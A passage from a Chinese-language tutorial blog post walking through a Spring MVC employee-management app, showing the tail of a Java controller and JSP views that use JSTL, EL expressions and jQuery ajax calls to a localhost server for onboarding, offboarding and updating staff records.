class="meta">@RequestParam(&quot;id&quot;)</span> String id, Model model)</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> UserService.findById(Integer.valueOf(id));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;user&quot;</span>, convertToDTO(user));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;userOut&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/updateInfo&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">updateInfo</span><span class="params">(<span class="meta">@RequestParam(&quot;id&quot;)</span> String id, Model model)</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> UserService.findById(Integer.valueOf(id));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;user&quot;</span>, convertToDTO(user));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;updateUser&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/save&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">save</span><span class="params">(<span class="meta">@RequestBody</span> UserDTO user)</span>&#123;</span><br><span class="line">        UserService.save(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;userManage&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/update&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">update</span><span class="params">(<span class="meta">@RequestBody</span> UserDTO user)</span>&#123;</span><br><span class="line">        UserService.update(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;userManage&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/updateStatus&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">updateStatus</span><span class="params">(<span class="meta">@RequestBody</span> UserDTO user)</span>&#123;</span><br><span class="line">        UserService.updateStatus(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;userManage&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;UserDTO&gt; <span class="title function_">convertToList</span><span class="params">(List&lt;User&gt; users)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(CollectionUtils.isEmpty(users))&#123;</span><br><span class="line">            <span class="keyword">return</span> Collections.EMPTY_LIST;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;UserDTO&gt; userList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;UserDTO&gt;();</span><br><span class="line">        <span class="keyword">for</span>(User user: users)&#123;</span><br><span class="line">            userList.add(convertToDTO(user));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> userList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDTO <span class="title function_">convertToDTO</span><span class="params">(User user)</span>&#123;</span><br><span class="line">        <span class="type">UserDTO</span> <span class="variable">userDTO</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserDTO</span>();</span><br><span class="line">        userDTO.setId(String.valueOf(user.getId()));</span><br><span class="line">        userDTO.setName(user.getName());</span><br><span class="line">        userDTO.setNo(user.getNo());</span><br><span class="line">        userDTO.setPosition(user.getPosition());</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(user.getStatus()))&#123;</span><br><span class="line">            userDTO.setStatus(<span class="string">&quot;在职&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(user.getStatus()))&#123;</span><br><span class="line">            userDTO.setStatus(<span class="string">&quot;已离职&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        userDTO.setReason(user.getReason());</span><br><span class="line">        <span class="keyword">return</span> userDTO;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="View界面"><a href="#View界面" class="headerlink" title="View界面"></a>View界面</h2><p>view界面一般由jsp编写，用于展示页面<br>在这个项目中编写四个view界面</p><h3 id="userManage-jsp"><a href="#userManage-jsp" class="headerlink" title="userManage.jsp"></a>userManage.jsp</h3><p>&lt;c:forEach&gt;标签是JSTL所支持的标签，使用时需要在开头导入taglib，作用是java中的for循环</p><p>${作用域对象别名.共享数据名.属性名}是EL表达式，获取{}中的值，${user.name}相当于如下操作：<br>User user &#x3D; (User)request(搜寻范围).getAttribute(user);<br>  String name &#x3D; user.getName();</p><p>script标签用于定义客户端脚本JavaScript<br>function用于声明一个函数，函数名对应onclick事件<br>window.open(url,’_self’) 在当前窗口打开一个新的窗口</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>用户管理系统<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-left:63%&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;in&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;into()&quot;</span>&gt;</span>办理入职<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>工号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>职位<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>状态<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">&quot;$&#123;users&#125;&quot;</span> <span class="attr">var</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;50&quot;</span>&gt;</span>$&#123;user.name&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;50&quot;</span>&gt;</span>$&#123;user.no&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span>&gt;</span>$&#123;user.position&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>  <span class="attr">width</span>=<span class="string">&quot;100&quot;</span>&gt;</span> $&#123;user.status&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>  <span class="attr">width</span>=<span class="string">&quot;200&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;out&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;out($&#123;user.id&#125;)&quot;</span>&gt;</span>办理离职<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;update&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;info($&#123;user.id&#125;)&quot;</span>&gt;</span>信息更新<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">into</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> url = <span class="string">&quot;http://localhost:8080/User/in&quot;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="title function_">open</span>(url,<span class="string">&#x27;_self&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">out</span>(<span class="params">id</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> userId = id</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> url = <span class="string">&quot;http://localhost:8080/User/out?id=&quot;</span> + userId;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="title function_">open</span>(url,<span class="string">&#x27;_self&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">info</span>(<span class="params">id</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> userId = id</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> url = <span class="string">&quot;http://localhost:8080/User/updateInfo?id=&quot;</span> + userId;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="title function_">open</span>(url,<span class="string">&#x27;_self&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="userIn-jsp"><a href="#userIn-jsp" class="headerlink" title="userIn.jsp"></a>userIn.jsp</h3><p>$(“#join”) 是jquery 中的id选择器， 语法： $(“#dom对象的id值”)<br>jquery给dom对象绑定事件：<br>语法： $(选择器).事件名称( 事件的处理函数)<br>      $(选择器)：定位dom对象， dom对象可以有多个， 这些dom对象都绑定事件了<br>       事件名称：就是js中事件去掉on的部分， 例如 js中的单击事件 onclick(),jquery中的事件名称，就是click，都是小写的。<br>      事件的处理函数：就是一个function ，当事件发生时，执行这个函数的内容。</p><p> $.ajax() : jquery中实现ajax的核心函数。<br>ajax是用来做局部刷新的。局部刷新使用的核心对象是 异步对象（XMLHttpRequest）</p><p>该函数的参数如下：<br>url 发送请求的地址<br>type 请求方式 默认为get<br>dataType 预期服务器返回的数据类型<br>contentType 发送信息至服务器时内容编码类型<br>data 发送到服务器的数据<br>(JSON.stringify() 方法将一个 JavaScript 对象或值转换为 JSON 字符串)<br>success 请求成功后调用的回调函数</p><p>该方法的更多参数如下链接：<br><a href="https://blog.csdn.net/Ha_Girl/article/details/90710491">https://blog.csdn.net/Ha_Girl/article/details/90710491</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>新员工入职办理<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>工号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;no&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>职位<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;position&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;join&quot;</span>&gt;</span>保存<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  $(<span class="string">&quot;#join&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> url = <span class="string">&quot;http://localhost:8080/User/save&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> name = $(<span class="string">&quot; input[id=&#x27;name&#x27; ] &quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> no = $(<span class="string">&quot; input[id=&#x27;no&#x27; ] &quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> position = $(<span class="string">&quot; input[id=&#x27;position&#x27; ] &quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> data = &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;name&quot;</span>: name,</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;no&quot;</span>: no,</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;position&quot;</span>: position</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">type</span>: <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">url</span>: url,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">dataType</span>: <span class="string">&quot;json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">contentType</span>: <span class="string">&quot;application/json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data),</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> url = <span class="string">&quot;http://localhost:8080/User/findAll&quot;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="title function_">open</span>(url, <span class="string">&#x27;_self&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(data);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="userOut-jsp"><a href="#userOut-jsp" class="headerlink" title="userOut.jsp"></a>userOut.jsp</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>员工离职办理<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;user.name&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>工号<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;no&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;user.no&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>职位<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;position&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;user.position&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>状态<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;status&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;user.status&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>离职原因<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;reason&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;out&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;user.id&#125;&quot;</span>&gt;</span>确认办理<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  $(<span class="string">&quot;#out&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> _that = <span class="variable language_">this</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> id = _that.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> url = <span class="string">&quot;http://localhost:8080/User/updateStatus&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> status = <span class="string">&quot;2&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> reason = $(<span class="string">&quot; input[id=&#x27;reason&#x27; ] &quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(reason);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> data = &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;id&quot;</span>:id,</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;status&quot;</span>:status,</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;reason&quot;</span>:reason</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">type</span>: <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">url</span>: url,</span></span><br><span class="line"><span class="language-javascript">      dataType : <span class="string">&quot;text&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      contentType : <span class="string">&quot;application/json&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data),</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//跳转回列表</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> url = <span class="string">&quot;http://localhost:8080/User/findAll&quot;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="title function_">open</span>(url,<span class="string">&#x27;_self&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="updataUser-jsp"><a href="#updataUser-jsp" class="headerlink" title="updataUser.jsp"></a>updataUser.jsp</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span>员工信息更新<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 